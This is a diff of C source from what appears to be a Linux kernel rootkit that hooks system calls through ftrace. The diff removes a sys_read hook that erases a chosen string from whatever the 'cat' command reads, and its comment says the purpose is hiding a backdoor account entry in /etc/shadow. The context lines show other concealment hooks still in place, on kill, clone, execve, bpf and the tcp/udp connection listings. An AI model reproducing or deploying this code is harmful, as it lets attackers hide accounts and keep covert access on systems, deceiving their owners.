@@ -27,7 +27,6 @@
 sys64 real_m_exit_group;
 sys64 real_m_clone;
 sys64 real_m_kill;
-sys64 real_m_read;
 sys64 real_m_execve;
 sys64 real_m_bpf;
 
@@ -177,67 +176,6 @@ static asmlinkage long m_kill(struct pt_regs *regs)
 
 leave:
     return real_m_kill(regs);
-}
-
-/**
- * Will hide a string from files, if command
- * cat is used
- *
- * Use case here is for hiding an entry in /etc/shadow
- * and that's it.
- * Example:
- *
- * $ echo "-f example:\$y\$j9T\$ZAe6Sm4X7K5Trr0yvZFXO.\$hVPrdvJjQBthxljTJegIZlEfX/LRkXHo4rCVp1MaI.1:19097:0:99999:7:::" >/proc/kovid
- *
- * Notice the need to escape $ characters
- */
-static asmlinkage long m_read(struct pt_regs *regs) {
-
-    char *buf = NULL, *s;
-    const char __user *arg;
-    size_t size;
-    long rv;
-    struct fs_file_node *fs = NULL;
-
-    /** call the real thing first */
-    rv = real_m_read(regs);
-
-    s = kv_get_hidden_string();
-    if (!s)
-        goto out;
-
-    fs = fs_get_file_node(current);
-    if (!fs || !fs->filename)
-        goto out;
-
-    /** Apply only for cat command */
-    if (strcmp(fs->filename, "cat") != 0)
-        goto out;
-
-    size = PT_REGS_PARM3(regs);
-    if (!(buf = (char *)kmalloc(size, GFP_KERNEL)))
-        goto out;
-
-    arg = (const char __user*)PT_REGS_PARM2(regs);
-    if (!copy_from_user((void *)buf, (void *)arg, size)) {
-        char *dest = strstr(buf, s);
-        char *src = dest + strlen(s);
-
-        if (dest < src && dest && src) {
-            int newrv, n = size - (src - buf);
-
-            /** eat-up the string */
-            memmove((void *)dest, (void *)src, n);
-            newrv = size - (src - dest);
-            if (!copy_to_user((void *)arg, (void *)buf, newrv))
-                rv = newrv;
-        }
-    }
-
-out:
-    kv_mem_free(&fs, &buf);
-
-    return rv;
 }
 
 /**
@@ -983,7 +921,6 @@ static struct ftrace_hook ft_hooks[] = {
     {"sys_exit_group", m_exit_group, &real_m_exit_group, true},
     {"sys_clone", m_clone, &real_m_clone, true},
     {"sys_kill", m_kill, &real_m_kill, true},
-    {"sys_read", m_read, &real_m_read, true},
     {"sys_bpf", m_bpf, &real_m_bpf, true},
     {"tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show},
     {"udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show},
